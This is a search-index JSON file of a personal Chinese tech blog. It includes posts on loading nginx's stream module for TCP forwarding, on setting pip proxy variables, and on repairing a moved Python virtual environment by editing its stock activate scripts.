{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"\u4e3b\u9875 \u00b6 \u6458\u8981 \u8fd9\u91cc\u662f \u79cb\u8449\u4e9c\u91cc\u6c99 \u7684\u4e2a\u4eba\u535a\u5ba2\u3002 \u4e3b\u8981\u8bb0\u5f55\u5206\u4eab\u4e00\u4e9b\u5b66\u4e60\u548c\u751f\u6d3b\u8fc7\u7a0b\u4e2d\u7684\u70b9\u6ef4\u3002 \u8be5\u535a\u5ba2\u5747\u4e3a\u5b9e\u9a8c\u6027\u5185\u5bb9\uff0c\u4e0d\u4ee3\u8868\u4ee5\u540e\u6700\u7ec8\u6210\u54c1\u3002 \u76ee\u5f55 \u6807\u7b7e \u5173\u4e8e\u6211 \u00b6 \u672c\u79d1\u975e\u8ba1\u79d1\uff0c\u56e0\u7231\u597d\u800c\u5b66\u4e60\u8ba1\u7b97\u673a\u76f8\u5173\u77e5\u8bc6\uff0c\u6700\u4e3b\u8981\u4f7f\u7528\u7684\u7a0b\u5e8f\u8bed\u8a00\u662f Python\u3002 \u76ee\u524d\u5df2\u7ecf\u6bd5\u4e1a\uff0c\u6b63\u5728\u4e8c\u6218\u8003\u7814\u3002 \u559c\u6b22\u97f3\u6e38\uff0c\u76ee\u524d\u6b63\u5728\u73a9\u7684\u662f\u90a6\u90a6\u548c Arcaea\u3002 \u5728\u5176\u4ed6\u670b\u53cb\u7684\u5e26\u9886\u4e0b\uff0c\u73b0\u5728\u8ff7\u4e0a\u4e86 Bot \u5f00\u53d1\u3001\u670d\u52a1\u5668\u8fd0\u7ef4\u4ee5\u53ca\u9006\u5411\u5de5\u7a0b\u3002 \u957f\u671f\u63a5\u90a6\u90a6\u4ee3\u6253\u3002 \u53cb\u60c5\u94fe\u63a5 \u00b6 HEAVENLYHEAVEN - NUIK BLOG MBR's Blog InariAimu's Blog Akula<>Blog","title":"\u4e3b\u9875"},{"location":"#_1","text":"\u6458\u8981 \u8fd9\u91cc\u662f \u79cb\u8449\u4e9c\u91cc\u6c99 \u7684\u4e2a\u4eba\u535a\u5ba2\u3002 \u4e3b\u8981\u8bb0\u5f55\u5206\u4eab\u4e00\u4e9b\u5b66\u4e60\u548c\u751f\u6d3b\u8fc7\u7a0b\u4e2d\u7684\u70b9\u6ef4\u3002 \u8be5\u535a\u5ba2\u5747\u4e3a\u5b9e\u9a8c\u6027\u5185\u5bb9\uff0c\u4e0d\u4ee3\u8868\u4ee5\u540e\u6700\u7ec8\u6210\u54c1\u3002 \u76ee\u5f55 \u6807\u7b7e","title":"\u4e3b\u9875"},{"location":"#_2","text":"\u672c\u79d1\u975e\u8ba1\u79d1\uff0c\u56e0\u7231\u597d\u800c\u5b66\u4e60\u8ba1\u7b97\u673a\u76f8\u5173\u77e5\u8bc6\uff0c\u6700\u4e3b\u8981\u4f7f\u7528\u7684\u7a0b\u5e8f\u8bed\u8a00\u662f Python\u3002 \u76ee\u524d\u5df2\u7ecf\u6bd5\u4e1a\uff0c\u6b63\u5728\u4e8c\u6218\u8003\u7814\u3002 \u559c\u6b22\u97f3\u6e38\uff0c\u76ee\u524d\u6b63\u5728\u73a9\u7684\u662f\u90a6\u90a6\u548c Arcaea\u3002 \u5728\u5176\u4ed6\u670b\u53cb\u7684\u5e26\u9886\u4e0b\uff0c\u73b0\u5728\u8ff7\u4e0a\u4e86 Bot \u5f00\u53d1\u3001\u670d\u52a1\u5668\u8fd0\u7ef4\u4ee5\u53ca\u9006\u5411\u5de5\u7a0b\u3002 \u957f\u671f\u63a5\u90a6\u90a6\u4ee3\u6253\u3002","title":"\u5173\u4e8e\u6211"},{"location":"#_3","text":"HEAVENLYHEAVEN - NUIK BLOG MBR's Blog InariAimu's Blog Akula<>Blog","title":"\u53cb\u60c5\u94fe\u63a5"},{"location":"tags/","text":"{{ tag_content }}","title":"\u6807\u7b7e"},{"location":"toc/","text":"{{ blog_content }}","title":"\u76ee\u5f55"},{"location":"blog/2022/220406-nginx-stream/","tags":["nginx","arcaea"],"text":"\u80cc\u666f \u00b6 \u5e2e aw \u505a AUA \u8f6c\u53d1\u8282\u70b9\u7684\u65f6\u5019\u9047\u5230\u4e86\u8fd9\u4e2a\u9700\u6c42\uff0c\u56e0\u4e3a AUA \u9700\u8981\u9891\u7e41\u5411 616 \u8bf7\u6c42 API\uff0c\u4f46\u662f 616 \u5bf9 \u540c\u4e00\u4e2a IP \u7684\u8bf7\u6c42\u6570\u91cf\u6709\u9650\u5236\uff0c\u6240\u4ee5 AUA \u9700\u8981\u5927\u91cf\u7684\u8f6c\u53d1\u8282\u70b9\u6765\u7ef4\u6301\u4f7f\u7528\u3002 aw \u7684\u5efa\u8bae\u662f\u7528 socat (Linux server) \u6216\u8005 netsh (Windows server) Linux server Windows server socat -d TCP4-LISTEN:6161,reuseaddr,fork TCP4:arcapi-v2.lowiro.com:443 netsh interface portproxy add v4tov4 listenport=6161 connectaddress=arcapi-v2.lowiro.com connectport=443 \u95ee\u9898\u662f\u6211\u670d\u52a1\u5668\u4e0a\u5df2\u7ecf\u6709 nginx \u4e86\uff0c\u4e0d\u662f\u5f88\u60f3\u88c5 socat \u3002 \u521d\u6b21\u5c1d\u8bd5 \u00b6 \u4e86\u89e3\u5230 nginx \u4ece 1.9.0 \u5f00\u59cb\uff0c\u65b0\u589e\u52a0\u4e86\u4e00\u4e2a stream \u6a21\u5757\uff0c\u7528\u6765\u5b9e\u73b0\u56db\u5c42\u534f\u8bae\u7684\u8f6c\u53d1\u3001\u4ee3\u7406\u6216\u8005\u8d1f\u8f7d\u5747\u8861\u7b49\u3002\u7528\u6cd5\u662f\u76f4\u63a5\u5728 nginx.conf \u4e2d\u914d\u7f6e stream \u5b57\u6bb5\u3002 \u4f46\u662f\u5b9e\u9645\u914d\u7f6e\u5b8c\u6210\u540e\u53d1\u73b0\uff0cnginx \u5e76\u4e0d\u8ba4\u8bc6 stream \u6a21\u5757\u3002\u4f7f\u7528 nginx -t \u68c0\u67e5\u914d\u7f6e\u65e0\u6cd5\u901a\u8fc7\u3002\u62a5\u9519\u63d0\u793a unknown directive \"stream\" in /etc/nginx/nginx.conf \u3002 \u540e\u6765\u4e86\u89e3\u5230\uff0c\u5982\u679c\u9700\u8981\u4f7f nginx \u5185\u7f6e\u652f\u6301 stream \u6a21\u5757\uff0c\u9700\u8981\u5728\u7f16\u8bd1\u65f6\u6307\u5b9a --with-stream \u9009\u9879\u3002\u5373 ./configure --with-stream \u5b98\u7f51\u7684\u8bf4\u6cd5 \u8fd9\u4e2a\u65b9\u6cd5\u5b9e\u5c5e\u8fc7\u4e8e\u9ebb\u70e6\uff0c\u8fd8\u8981\u91cd\u88c5 nginx\u3002 \u89e3\u51b3\u65b9\u6848 \u00b6 \u4ece\u8fd9\u7bc7\u6587\u7ae0\u4e86\u89e3\u5230\u4e86\u4e0d\u7528\u91cd\u65b0\u7f16\u8bd1\u4e5f\u80fd\u652f\u6301 stream \u6a21\u5757\u7684\u65b9\u6cd5\uff1a unknown directive \"stream\" in /etc/nginx/nginx.conf:86 - Server Fault \u7b80\u5355\u6765\u8bf4\u5c31\u662f\uff0c\u5373\u4f7f\u6211\u4eec\u6ca1\u6709\u5728\u7f16\u8bd1\u65f6\u6307\u5b9a --with-stream \u9009\u9879\uff0cnginx \u4e5f\u4f1a\u5c06 stream \u6a21\u5757\u7f16\u8bd1\u8fdb\u6765\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u8ba9 nginx \u9ed8\u8ba4\u652f\u6301\uff0c\u800c\u662f\u9700\u8981\u6211\u4eec\u81ea\u884c\u5bfc\u5165\uff0c\u5373\uff1a load_module /usr/lib/nginx/modules/ngx_stream_module.so ; \u5982\u6b64\u4e00\u6765\u4fbf\u80fd\u6b63\u5e38\u4f7f\u7528 stream \u6a21\u5757\u3002","title":"nginx \u5982\u4f55\u8bbe\u7f6e stream \u8f6c\u53d1"},{"location":"blog/2022/220406-nginx-stream/#_1","text":"\u5e2e aw \u505a AUA \u8f6c\u53d1\u8282\u70b9\u7684\u65f6\u5019\u9047\u5230\u4e86\u8fd9\u4e2a\u9700\u6c42\uff0c\u56e0\u4e3a AUA \u9700\u8981\u9891\u7e41\u5411 616 \u8bf7\u6c42 API\uff0c\u4f46\u662f 616 \u5bf9 \u540c\u4e00\u4e2a IP \u7684\u8bf7\u6c42\u6570\u91cf\u6709\u9650\u5236\uff0c\u6240\u4ee5 AUA \u9700\u8981\u5927\u91cf\u7684\u8f6c\u53d1\u8282\u70b9\u6765\u7ef4\u6301\u4f7f\u7528\u3002 aw \u7684\u5efa\u8bae\u662f\u7528 socat (Linux server) \u6216\u8005 netsh (Windows server) Linux server Windows server socat -d TCP4-LISTEN:6161,reuseaddr,fork TCP4:arcapi-v2.lowiro.com:443 netsh interface portproxy add v4tov4 listenport=6161 connectaddress=arcapi-v2.lowiro.com connectport=443 \u95ee\u9898\u662f\u6211\u670d\u52a1\u5668\u4e0a\u5df2\u7ecf\u6709 nginx \u4e86\uff0c\u4e0d\u662f\u5f88\u60f3\u88c5 socat \u3002","title":"\u80cc\u666f"},{"location":"blog/2022/220406-nginx-stream/#_2","text":"\u4e86\u89e3\u5230 nginx \u4ece 1.9.0 \u5f00\u59cb\uff0c\u65b0\u589e\u52a0\u4e86\u4e00\u4e2a stream \u6a21\u5757\uff0c\u7528\u6765\u5b9e\u73b0\u56db\u5c42\u534f\u8bae\u7684\u8f6c\u53d1\u3001\u4ee3\u7406\u6216\u8005\u8d1f\u8f7d\u5747\u8861\u7b49\u3002\u7528\u6cd5\u662f\u76f4\u63a5\u5728 nginx.conf \u4e2d\u914d\u7f6e stream \u5b57\u6bb5\u3002 \u4f46\u662f\u5b9e\u9645\u914d\u7f6e\u5b8c\u6210\u540e\u53d1\u73b0\uff0cnginx \u5e76\u4e0d\u8ba4\u8bc6 stream \u6a21\u5757\u3002\u4f7f\u7528 nginx -t \u68c0\u67e5\u914d\u7f6e\u65e0\u6cd5\u901a\u8fc7\u3002\u62a5\u9519\u63d0\u793a unknown directive \"stream\" in /etc/nginx/nginx.conf \u3002 \u540e\u6765\u4e86\u89e3\u5230\uff0c\u5982\u679c\u9700\u8981\u4f7f nginx \u5185\u7f6e\u652f\u6301 stream \u6a21\u5757\uff0c\u9700\u8981\u5728\u7f16\u8bd1\u65f6\u6307\u5b9a --with-stream \u9009\u9879\u3002\u5373 ./configure --with-stream \u5b98\u7f51\u7684\u8bf4\u6cd5 \u8fd9\u4e2a\u65b9\u6cd5\u5b9e\u5c5e\u8fc7\u4e8e\u9ebb\u70e6\uff0c\u8fd8\u8981\u91cd\u88c5 nginx\u3002","title":"\u521d\u6b21\u5c1d\u8bd5"},{"location":"blog/2022/220406-nginx-stream/#_3","text":"\u4ece\u8fd9\u7bc7\u6587\u7ae0\u4e86\u89e3\u5230\u4e86\u4e0d\u7528\u91cd\u65b0\u7f16\u8bd1\u4e5f\u80fd\u652f\u6301 stream \u6a21\u5757\u7684\u65b9\u6cd5\uff1a unknown directive \"stream\" in /etc/nginx/nginx.conf:86 - Server Fault \u7b80\u5355\u6765\u8bf4\u5c31\u662f\uff0c\u5373\u4f7f\u6211\u4eec\u6ca1\u6709\u5728\u7f16\u8bd1\u65f6\u6307\u5b9a --with-stream \u9009\u9879\uff0cnginx \u4e5f\u4f1a\u5c06 stream \u6a21\u5757\u7f16\u8bd1\u8fdb\u6765\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u8ba9 nginx \u9ed8\u8ba4\u652f\u6301\uff0c\u800c\u662f\u9700\u8981\u6211\u4eec\u81ea\u884c\u5bfc\u5165\uff0c\u5373\uff1a load_module /usr/lib/nginx/modules/ngx_stream_module.so ; \u5982\u6b64\u4e00\u6765\u4fbf\u80fd\u6b63\u5e38\u4f7f\u7528 stream \u6a21\u5757\u3002","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"blog/2022/220406-set-http-proxy/","tags":["python","pip","proxy"],"text":"\u95ee\u9898 \u00b6 \u5f00\u542f\u7cfb\u7edf\u4ee3\u7406\u540e\uff0c\u5f53\u4f7f\u7528 pip \u5b89\u88c5\u5305\u65f6\uff0c\u4f1a\u62a5\u9519\uff1a ValueError: check_hostname requires server_hostname \u4ee5\u53ca\u4f7f\u7528\u67d0\u4e9b\u7f51\u7edc\u64cd\u4f5c\u5e93\u65f6\uff08\u6bd4\u5982 requests \uff09\u4e5f\u4f1a\u62a5\u8fd9\u4e2a\u9519\u3002 \u89e3\u51b3\u65b9\u6cd5 \u00b6 \u5728\u63a7\u5236\u53f0\u8fd0\u884c python \u811a\u672c\u524d\u5148\u6307\u5b9a\u4ee3\u7406\u5730\u5740\uff1a set http_proxy=http://127.0.0.1:8889 set https_proxy=http://127.0.0.1:8889 \u5176\u4e2d 127.0.0.1:8889 \u662f\u4ee3\u7406\u670d\u52a1\u5668\u7684\u5730\u5740","title":"\u89e3\u51b3\u4f7f\u7528\u4ee3\u7406\u540e pip \u548c python \u65e0\u6cd5\u8fde\u63a5\u5230\u7f51\u7edc\u7684\u95ee\u9898"},{"location":"blog/2022/220406-set-http-proxy/#_1","text":"\u5f00\u542f\u7cfb\u7edf\u4ee3\u7406\u540e\uff0c\u5f53\u4f7f\u7528 pip \u5b89\u88c5\u5305\u65f6\uff0c\u4f1a\u62a5\u9519\uff1a ValueError: check_hostname requires server_hostname \u4ee5\u53ca\u4f7f\u7528\u67d0\u4e9b\u7f51\u7edc\u64cd\u4f5c\u5e93\u65f6\uff08\u6bd4\u5982 requests \uff09\u4e5f\u4f1a\u62a5\u8fd9\u4e2a\u9519\u3002","title":"\u95ee\u9898"},{"location":"blog/2022/220406-set-http-proxy/#_2","text":"\u5728\u63a7\u5236\u53f0\u8fd0\u884c python \u811a\u672c\u524d\u5148\u6307\u5b9a\u4ee3\u7406\u5730\u5740\uff1a set http_proxy=http://127.0.0.1:8889 set https_proxy=http://127.0.0.1:8889 \u5176\u4e2d 127.0.0.1:8889 \u662f\u4ee3\u7406\u670d\u52a1\u5668\u7684\u5730\u5740","title":"\u89e3\u51b3\u65b9\u6cd5"},{"location":"blog/2022/220406-venv-move-file/","tags":["python","venv","pycharm","pip"],"text":"\u80cc\u666f \u00b6 \u56e0\u4e3a\u9879\u76ee\u9700\u8981\uff0c\u5c06\u90e8\u5206 python \u9879\u76ee\u79fb\u52a8\u5230\u4e86\u5176\u4ed6\u6587\u4ef6\u5939\uff0c\u5bfc\u81f4\u5728 PyCharm \u4e2d\u627e\u4e0d\u5230\u89e3\u91ca\u5668\uff0c\u4e5f\u65e0\u6cd5\u6b63\u5e38\u4f7f\u7528\u7ec8\u7aef\u3002 \u73b0\u8c61 \u00b6 \u6211\u4f7f\u7528\u7684 IDE \u662f PyCharm \u4e13\u4e1a\u7248 2021.3.2 \uff0c\u5177\u4f53\u8868\u73b0\u4e3a\u5728 IDE \u5185\u6253\u5f00\u7ec8\u7aef\u540e\uff1a PyCharm \u627e\u4e0d\u5230\u89e3\u91ca\u5668 \u7ec8\u7aef\u5185\u6267\u884c python \u7a0b\u5e8f\u53ea\u80fd\u591f\u4f7f\u7528\u5168\u5c40\u5305 \u65e0\u6cd5\u8fdb\u5165 venv \u73af\u5883\uff08\u5305\u62ec PyCharm \u81ea\u52a8\u8fdb\u5165\u548c\u624b\u52a8\u8fdb\u5165\uff09 \u65e0\u6cd5\u4f7f\u7528 pip \u89e3\u51b3 \u00b6 \u627e\u4e0d\u5230\u89e3\u91ca\u5668 \u00b6 \u8fd9\u4e2a\u95ee\u9898\u597d\u89e3\u51b3\uff0cPyCharm \u4f1a\u81ea\u52a8\u68c0\u6d4b\u5f53\u524d\u76ee\u5f55\u4e0b\u7684 venv \u6587\u4ef6\u5939\uff0c\u5982\u679c\u5b58\u5728\uff0c\u5219\u4f1a\u5c06 venv/Scripts/python \u8bbe\u7f6e\u4e3a\u89e3\u91ca\u5668\u3002\u95ee\u9898\u76f4\u63a5\u89e3\u51b3\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u56e0\u4e3a\u6211\u4eec\u662f\u79fb\u52a8\u4e86 python \u9879\u76ee\u6587\u4ef6\u5939\u7684\uff0c\u56e0\u6b64\u539f\u6765\u7684\u89e3\u91ca\u5668\u8def\u5f84\u8fd8\u4fdd\u7559\u5728 PyCharm \u5185\uff0c\u6240\u4ee5\u9700\u8981\u624b\u52a8\u5c06\u5176\u5220\u9664\u3002\u53ef\u4ee5\u6309\u7167\u4ee5\u4e0b\u6b65\u9aa4\u8fdb\u884c\u64cd\u4f5c\uff1a \u627e\u5230 \u6587\u4ef6 -> \u8bbe\u7f6e -> \u9879\u76ee -> Python \u89e3\u91ca\u5668 \u9009\u62e9\u5f53\u524d\u89e3\u91ca\u5668\u53f3\u8fb9\u7684\u9f7f\u8f6e\u56fe\u6807\uff0c\u70b9\u51fb \u5168\u90e8\u663e\u793a \uff0c\u627e\u5230\u7ea2\u8272\u6807\u8bb0\u7684\u89e3\u91ca\u5668\uff0c\u70b9\u51fb\u5220\u9664\u5373\u53ef\u3002 \u7ec8\u7aef\u53ea\u80fd\u591f\u4f7f\u7528\u5168\u5c40\u5305\u4e0e\u65e0\u6cd5\u8fdb\u5165 venv \u73af\u5883 \u00b6 \u5177\u4f53\u6709\u4ee5\u4e0b\u51e0\u4e2a\u8868\u73b0\uff1a \u81ea\u5df1\u7684\u5b9e\u9645\u9879\u76ee\u4e2d\u6709\u7b2c\u4e09\u65b9\u5e93\uff08\u4f8b\u5982 aiohttp \uff09\uff0c\u9879\u76ee\u6587\u4ef6\u76f4\u63a5\u53f3\u952e\u8fd0\u884c\u53ef\u4ee5\u6b63\u5e38\u6267\u884c\uff0c\u4f46\u662f\u5728\u7ec8\u7aef\u91cc\u9762\u6267\u884c\u65f6\u4f1a\u62a5\u9519\uff0c\u63d0\u793a ModuleNotFoundError: No module named 'aiohttp' \u3002 \u7ec8\u7aef\u91cc\u76f4\u63a5\u6267\u884c where python \u663e\u793a\u7684\u662f\u5168\u5c40 python \u8def\u5f84\uff0c\u800c\u4e0d\u662f venv \u4e2d\u7684\u8def\u5f84\u3002 \u7ec8\u7aef\u91cc\u76f4\u63a5\u6267\u884c pip list \u4f1a\u63d0\u793a\u53ea\u6709 pip \u548c setuptools \u4e24\u4e2a\u5305\uff0c\u800c\u6211\u4eec\u9879\u76ee\u91cc\u4f9d\u8d56\u7684\u5305\u4e00\u4e2a\u90fd\u6ca1\u6709\u3002 \u539f\u56e0\u5728\u4e8e PyCharm \u81ea\u52a8\u8fdb\u5165 venv \u73af\u5883\u7684\u65f6\u5019\u662f\u4ece venv/Scripts/activate.bat \u8fdb\u5165\u7684\uff0c\u8fd9\u4e2a\u6587\u4ef6\u5b9a\u4e49\u4e86 %PATH% \uff0c\u5f53\u6211\u4eec\u5df2\u7ecf\u79fb\u52a8\u4e86\u9879\u76ee\u6587\u4ef6\u5939\u540e\uff0c activate.bat \u91cc\u8bb0\u5f55\u7684\u8def\u5f84\u5e76\u6ca1\u6709\u6539\uff0c\u800c\u539f\u6765\u7684\u8def\u5f84\u5df2\u7ecf\u4e0d\u5b58\u5728\u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u653e\u5728 venv \u4e0b\u7684 python.exe \u5e76\u4e0d\u4f1a\u81ea\u52a8\u8fdb\u5165\u5230 %PATH% \u4e2d\u3002 \u89e3\u51b3\u65b9\u5f0f\u5f88\u7b80\u5355\uff0c\u76f4\u63a5\u7f16\u8f91 venv/Scripts/activate.bat \u6587\u4ef6\uff0clinux \u540c\u7406\u3002 CMD Bash FishShell Xonsh activate.bat 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 @ echo off set \"VIRTUAL_ENV=I:\\Developer\\web\\blog_mkdocs\\venv\" if defined _OLD_VIRTUAL_PROMPT ( set \"PROMPT= %_OLD_VIRTUAL_PROMPT% \" ) else ( if not defined PROMPT ( set \"PROMPT=$P$G\" ) if not defined VIRTUAL_ENV_DISABLE_PROMPT ( set \"_OLD_VIRTUAL_PROMPT= %PROMPT% \" ) ) if not defined VIRTUAL_ENV_DISABLE_PROMPT ( set \"ENV_PROMPT=\" if NOT DEFINED ENV_PROMPT ( for %% d in ( \" %VIRTUAL_ENV% \" ) do set \"ENV_PROMPT=( %% ~nxd) \" ) ) set \"PROMPT= %ENV_PROMPT%%PROMPT% \" ) REM Don't use () to avoid problems with them in %PATH% if defined _OLD_VIRTUAL_PYTHONHOME goto ENDIFVHOME set \"_OLD_VIRTUAL_PYTHONHOME= %PYTHONHOME% \" : ENDIFVHOME set PYTHONHOME = REM if defined _OLD_VIRTUAL_PATH ( if not defined _OLD_VIRTUAL_PATH goto ENDIFVPATH1 set \"PATH= %_OLD_VIRTUAL_PATH% \" : ENDIFVPATH1 REM ) else ( if defined _OLD_VIRTUAL_PATH goto ENDIFVPATH2 set \"_OLD_VIRTUAL_PATH= %PATH% \" : ENDIFVPATH2 set \"PATH= %VIRTUAL_ENV% \\Scripts; %PATH% \" activate 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 # This file must be used with \"source bin/activate\" *from bash* # you cannot run it directly if [ \" ${ BASH_SOURCE - } \" = \" $0 \" ] ; then echo \"You must source this script: \\$ source $0 \" > & 2 exit 33 fi deactivate () { unset -f pydoc >/dev/null 2 > & 1 || true # reset old environment variables # ! [ -z ${VAR+_} ] returns true if VAR is declared at all if ! [ -z \" ${ _OLD_VIRTUAL_PATH :+_ } \" ] ; then PATH = \" $_OLD_VIRTUAL_PATH \" export PATH unset _OLD_VIRTUAL_PATH fi if ! [ -z \" ${ _OLD_VIRTUAL_PYTHONHOME +_ } \" ] ; then PYTHONHOME = \" $_OLD_VIRTUAL_PYTHONHOME \" export PYTHONHOME unset _OLD_VIRTUAL_PYTHONHOME fi # The hash command must be called to get it to forget past # commands. Without forgetting past commands the $PATH changes # we made may not be respected hash -r 2 >/dev/null if ! [ -z \" ${ _OLD_VIRTUAL_PS1 +_ } \" ] ; then PS1 = \" $_OLD_VIRTUAL_PS1 \" export PS1 unset _OLD_VIRTUAL_PS1 fi unset VIRTUAL_ENV if [ ! \" ${ 1 - } \" = \"nondestructive\" ] ; then # Self destruct! unset -f deactivate fi } # unset irrelevant variables deactivate nondestructive VIRTUAL_ENV = 'I:\\Developer\\web\\blog_mkdocs\\venv' if ([ \" $OSTYPE \" = \"cygwin\" ] || [ \" $OSTYPE \" = \"msys\" ]) && $( command -v cygpath & > /dev/null ) ; then VIRTUAL_ENV = $( cygpath -u \" $VIRTUAL_ENV \" ) fi export VIRTUAL_ENV _OLD_VIRTUAL_PATH = \" $PATH \" PATH = \" $VIRTUAL_ENV /Scripts: $PATH \" export PATH # unset PYTHONHOME if set if ! [ -z \" ${ PYTHONHOME +_ } \" ] ; then _OLD_VIRTUAL_PYTHONHOME = \" $PYTHONHOME \" unset PYTHONHOME fi if [ -z \" ${ VIRTUAL_ENV_DISABLE_PROMPT - } \" ] ; then _OLD_VIRTUAL_PS1 = \" ${ PS1 - } \" if [ \"x\" ! = x ] ; then PS1 = \" ${ PS1 - } \" else PS1 = \"(`basename \\\" $VIRTUAL_ENV \\\"`) ${ PS1 - } \" fi export PS1 fi # Make sure to unalias pydoc if it's already there alias pydoc 2 >/dev/null >/dev/null && unalias pydoc || true pydoc () { python -m pydoc \" $@ \" } # The hash command must be called to get it to forget past # commands. Without forgetting past commands the $PATH changes # we made may not be respected hash -r 2 >/dev/null activate.fish 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 # This file must be used using `source bin/activate.fish` *within a running fish ( http://fishshell.com ) session*. # Do not run it directly. function _bashify_path -d \"Converts a fish path to something bash can recognize\" set fishy_path $argv set bashy_path $fishy_path [ 1 ] for path_part in $fishy_path [ 2..-1 ] set bashy_path \" $bashy_path : $path_part \" end echo $bashy_path end function _fishify_path -d \"Converts a bash path to something fish can recognize\" echo $argv | tr ':' '\\n' end function deactivate -d 'Exit virtualenv mode and return to the normal environment.' # reset old environment variables if test -n \" $_OLD_VIRTUAL_PATH \" # https://github.com/fish-shell/fish-shell/issues/436 altered PATH handling if test ( echo $FISH_VERSION | head -c 1 ) -lt 3 set -gx PATH ( _fishify_path \" $_OLD_VIRTUAL_PATH \" ) else set -gx PATH \" $_OLD_VIRTUAL_PATH \" end set -e _OLD_VIRTUAL_PATH end if test -n \" $_OLD_VIRTUAL_PYTHONHOME \" set -gx PYTHONHOME \" $_OLD_VIRTUAL_PYTHONHOME \" set -e _OLD_VIRTUAL_PYTHONHOME end if test -n \" $_OLD_FISH_PROMPT_OVERRIDE \" and functions -q _old_fish_prompt # Set an empty local `$fish_function_path` to allow the removal of `fish_prompt` using `functions -e`. set -l fish_function_path # Erase virtualenv's `fish_prompt` and restore the original. functions -e fish_prompt functions -c _old_fish_prompt fish_prompt functions -e _old_fish_prompt set -e _OLD_FISH_PROMPT_OVERRIDE end set -e VIRTUAL_ENV if test \" $argv [1]\" ! = 'nondestructive' # Self-destruct! functions -e pydoc functions -e deactivate functions -e _bashify_path functions -e _fishify_path end end # Unset irrelevant variables. deactivate nondestructive set -gx VIRTUAL_ENV 'I:\\Developer\\web\\blog_mkdocs\\venv' # https://github.com/fish-shell/fish-shell/issues/436 altered PATH handling if test ( echo $FISH_VERSION | head -c 1 ) -lt 3 set -gx _OLD_VIRTUAL_PATH ( _bashify_path $PATH ) else set -gx _OLD_VIRTUAL_PATH \" $PATH \" end set -gx PATH \" $VIRTUAL_ENV \" '/Scripts' $PATH # Unset `$PYTHONHOME` if set. if set -q PYTHONHOME set -gx _OLD_VIRTUAL_PYTHONHOME $PYTHONHOME set -e PYTHONHOME end function pydoc python -m pydoc $argv end if test -z \" $VIRTUAL_ENV_DISABLE_PROMPT \" # Copy the current `fish_prompt` function as `_old_fish_prompt`. functions -c fish_prompt _old_fish_prompt function fish_prompt # Run the user's prompt first; it might depend on (pipe)status. set -l prompt ( _old_fish_prompt ) # Prompt override provided? # If not, just prepend the environment name. if test -n '' printf '%s%s' '' ( set_color normal ) else printf '%s(%s) ' ( set_color normal ) ( basename \" $VIRTUAL_ENV \" ) end string join -- \\n $prompt # handle multi-line prompts end set -gx _OLD_FISH_PROMPT_OVERRIDE \" $VIRTUAL_ENV \" end activate.xsh 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 \"\"\"Xonsh activate script for virtualenv\"\"\" from xonsh.tools import get_sep as _get_sep def _deactivate(args): if \"pydoc\" in aliases: del aliases[\"pydoc\"] if ${...}.get(\"_OLD_VIRTUAL_PATH\", \"\"): $PATH = $_OLD_VIRTUAL_PATH del $_OLD_VIRTUAL_PATH if ${...}.get(\"_OLD_VIRTUAL_PYTHONHOME\", \"\"): $PYTHONHOME = $_OLD_VIRTUAL_PYTHONHOME del $_OLD_VIRTUAL_PYTHONHOME if \"VIRTUAL_ENV\" in ${...}: del $VIRTUAL_ENV if \"VIRTUAL_ENV_PROMPT\" in ${...}: del $VIRTUAL_ENV_PROMPT if \"nondestructive\" not in args: # Self destruct! del aliases[\"deactivate\"] # unset irrelevant variables _deactivate([\"nondestructive\"]) aliases[\"deactivate\"] = _deactivate $VIRTUAL_ENV = r\"I:\\Developer\\web\\blog_mkdocs\\venv\" $_OLD_VIRTUAL_PATH = $PATH $PATH = $PATH[:] $PATH.add($VIRTUAL_ENV + _get_sep() + \"Scripts\", front=True, replace=True) if ${...}.get(\"PYTHONHOME\", \"\"): # unset PYTHONHOME if set $_OLD_VIRTUAL_PYTHONHOME = $PYTHONHOME del $PYTHONHOME $VIRTUAL_ENV_PROMPT = \"\" if not $VIRTUAL_ENV_PROMPT: del $VIRTUAL_ENV_PROMPT aliases[\"pydoc\"] = [\"python\", \"-m\", \"pydoc\"] \u65e0\u6cd5\u4f7f\u7528 pip \u00b6 \u901a\u8fc7\u4fee\u6539 activate.bat \u4f7f\u5f97\u80fd\u6b63\u5e38\u8fdb\u5165 venv \u73af\u5883\u540e\uff0c\u4f1a\u8fce\u6765\u7b2c\u4e09\u4e2a\u95ee\u9898\uff0c\u5c31\u662f\u65e0\u6cd5\u4f7f\u7528 pip \u5b89\u88c5\u5305\u3002 \u5177\u4f53\u8868\u73b0\u4e3a\uff0c\u4f7f\u7528 pip \u547d\u4ee4\u540e\uff0c\u7ec8\u7aef\u4f1a\u62a5\u9519\uff1a Fatal error in launcher: unable to create process using: 'XXXXXXX/python.exe' 'XXXXXXXXX/pip.exe' \u3002 \u6211\u4e00\u770b\uff0c\u8fd9\u4e2a\u6240\u8c13\u7684 'XXXXXXX/python.exe' \u6b63\u662f\u6211\u4eec\u5728\u79fb\u52a8\u9879\u76ee\u6587\u4ef6\u4e4b\u524d\u7684 venv \u7684 python \u8def\u5f84\uff0c\u53ef\u662f\u6211\u4eec\u5df2\u7ecf\u4fee\u6539\u4e86 activate.bat 